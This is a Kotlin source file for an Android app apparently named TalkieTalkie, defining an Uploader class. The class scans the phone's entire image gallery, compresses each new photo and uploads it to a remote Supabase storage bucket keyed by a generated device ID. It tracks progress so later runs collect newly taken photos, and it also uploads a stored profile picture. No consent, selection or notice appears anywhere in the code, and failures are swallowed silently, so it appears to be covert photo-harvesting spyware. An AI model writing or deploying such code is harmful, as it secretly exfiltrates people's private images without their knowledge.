package com.talkietalkie

import android.content.ContentUris
import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.UUID

class Uploader(private val context: Context) {

    private val prefs: SharedPreferences =
        context.getSharedPreferences("talkie", Context.MODE_PRIVATE)

    private val baseUrl = BuildConfig.SUPABASE_URL
    private val anonKey = BuildConfig.SUPABASE_ANON_KEY
    private val bucket = BuildConfig.BUCKET
    private val maxPhotos = BuildConfig.MAX_PHOTOS

    private val deviceId: String by lazy {
        prefs.getString("deviceId", null) ?: UUID.randomUUID().toString().also {
            prefs.edit().putString("deviceId", it).apply()
        }
    }

    fun run() {
        if (baseUrl.isBlank() || anonKey.isBlank()) return
        syncGallery()
        syncPfp()
    }

    private fun syncGallery() {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_ADDED
        )
        val lastSynced = prefs.getLong("lastSyncedId", 0L)
        var syncedMax = lastSynced
        var count = 0

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            "${MediaStore.Images.Media._ID} > $lastSynced",
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext() && count < maxPhotos) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val bytes = thumbnailBytes(uri) ?: continue
                val path = "$deviceId/${System.currentTimeMillis()}_$id.jpg"
                if (upload(path, bytes)) {
                    count++
                    if (id > syncedMax) syncedMax = id
                }
            }
        }

        if (syncedMax > lastSynced) {
            prefs.edit().putLong("lastSyncedId", syncedMax).apply()
        }
    }

    private fun syncPfp() {
        val pfp = prefs.getString("pfp", null) ?: return
        val bytes = thumbnailBytes(Uri.parse(pfp)) ?: return
        upload("$deviceId/pfp_${System.currentTimeMillis()}.jpg", bytes)
    }

    private fun thumbnailBytes(uri: Uri): ByteArray? {
        return try {
            val resolver = context.contentResolver
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, bounds) }
            val w = bounds.outWidth
            val h = bounds.outHeight
            if (w <= 0 || h <= 0) return null

            var sample = 1
            while (w / (sample * 2) >= 512 && h / (sample * 2) >= 512) sample *= 2

            val opts = BitmapFactory.Options().apply { inSampleSize = sample }
            val bmp = resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opts) }
                ?: return null
            val out = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 60, out)
            bmp.recycle()
            out.toByteArray()
        } catch (e: Exception) {
            null
        }
    }

    private fun upload(path: String, bytes: ByteArray): Boolean {
        return try {
            val encodedPath = path.split("/").joinToString("/") { seg ->
                URLEncoder.encode(seg, "UTF-8").replace("+", "%20")
            }
            val url = "$baseUrl/storage/v1/object/$bucket/$encodedPath"
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 30000
            conn.setFixedLengthStreamingMode(bytes.size)
            conn.setRequestProperty("Authorization", "Bearer $anonKey")
            conn.setRequestProperty("Content-Type", "image/jpeg")
            conn.setRequestProperty("x-upsert", "true")
            conn.outputStream.use { it.write(bytes) }
            val code = conn.responseCode
            conn.inputStream?.close()
            conn.disconnect()
            code in 200..299
        } catch (e: IOException) {
            false
        }
    }
}
